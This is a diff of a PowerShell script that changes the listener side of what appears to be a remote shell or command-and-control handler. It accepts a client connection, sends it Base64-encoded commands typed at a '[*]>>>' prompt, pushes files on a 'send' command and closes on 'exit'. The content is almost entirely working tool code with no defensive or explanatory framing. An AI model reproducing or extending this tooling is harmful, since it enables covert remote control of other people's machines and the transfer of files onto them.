@@ -1,22 +1,11 @@
 ﻿
 function SendFile($stream,$filename)
 {
-    Get-ChildItem
-
-    if(Test-Path -Path $filename)
-    {
-        $FullPath = (Get-ChildItem -Path $filename).FullName ; Write-Host $FullPath
-        $FileAsBytes = [System.IO.File]::ReadAllBytes($FullPath)
-        Write-Host $FileAsBytes
-        $FileAsBytes | %{ $stream.Write($_) }
-        WRite-Host "Sent"
-        return
-    }
-    else 
-    {
-        Write-Host "[!] File not found "
-        return    
-    }
+    $targetFile  = Split-Path $filename -Leaf
+    $fileContent = Get-Content $filename -Encoding Byte
+    $transferStr = "$targetFile*$fileContent"
+    $transferStr | %{ $stream.Write($_) }
+    $stream.Flush()
 }
 function PSHandler($port)
 {
@@ -41,10 +30,6 @@ function PSHandler($port)
 
             $stream = $client.GetStream()
 
-            $bytes = New-Object System.Byte[] 1024
-
-            $encodingScheme = New-Object System.Text.ASCIIEncoding
-
             while($true)
             {
                 #$cmd   = $encodingScheme.GetString($bytes,0,$var)
@@ -58,28 +43,36 @@ function PSHandler($port)
                 {
                     if($plaintext_cmd | Select-String 'exit')
                     {
+                        $transmitter.WriteLine($cmd)
+                        $transmitter.Dispose()
+                        $receiver.Dispose()
+                        $stream.Close()
                         $client.Close()
-                        Write-Host "[~] Client connection closed"
-                        Write-Host "[~] Returning to main loop"
-                        Write-Host "[*] Listening on: $port"
-                        $plaintext_cmd         = Read-Host "[*]>>>"
-                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                        $cmd                   = [Convert]::ToBase64String($cmd)
+                        exit
                     }
                     if($plaintext_cmd | Select-String 'send')
                     {
-                        $fileName = $plaintext_cmd.Split(' ')[1]
-                        Write-Host "Pre function call: $fileName"
-                        SendFile $transmitter $fileName
-                        $transmitter.Flush()
-                        $plaintext_cmd         = Read-Host "[*]>>>"
-                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                        $cmd                   = [Convert]::ToBase64String($cmd)
+                       $transmission = '' 
+                       $command     = $plaintext_cmd.Split(' ')[0] 
+                       $filename    = $plaintext_cmd.Split(' ')[1] 
+                       $filename    = Split-Path $filename -Leaf
+                       
+                       $filecontent = Get-Content $filename -Encoding Byte
+                       $filecontent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
+                       $transmission = "$command+$filename+$filecontent"
+                       #$transmission = [System.Text.Encoding]::Unicode.GetBytes($transmission)
+                       #$transmission = [Convert]::ToBase64String($transmission) 
+                       #$conv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($transmission))
+                       $transmitter.WriteLine($transmission)
+                       $transmitter.Flush()
+                       $plaintext_cmd         = Read-Host "[*]>>>"
+                       $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                       $cmd                   = [Convert]::ToBase64String($cmd)
                     }
                     try
                     {
                         $transmitter.WriteLine($cmd)
-                        $transmitter.Flush() 
+                        $transmitter.Flush()
                     }
                     catch
                     {
